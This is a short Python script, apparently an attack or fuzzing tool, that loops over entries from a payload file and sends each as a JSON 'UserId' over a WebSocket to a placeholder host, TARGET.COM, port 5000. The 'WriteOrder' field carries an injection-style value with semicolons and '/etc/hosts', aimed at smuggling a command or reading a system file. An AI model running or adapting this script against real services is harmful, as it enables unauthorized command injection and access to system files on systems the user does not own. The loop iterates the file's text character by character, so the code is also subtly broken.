
##
##

import os,sys,re
import websocket,json
from pathlib import Path

payloads=Path('HAXXXXX.txt').read_text()
ws = websocket.WebSocket()

print(payloads)

## while True:
for xxx in payloads:
    ws.connect("ws://TARGET.COM:5000/")
    order = {"UserId":xxx, "WriteOrder":"LMFAOOOO; things ; /etc/hosts"}
    data = str(json.dumps(order))
    ws.send(data)
    resp = ws.recv()
    print(resp)
   
#    if "unknown" in resp:
#        break

###################
##
##

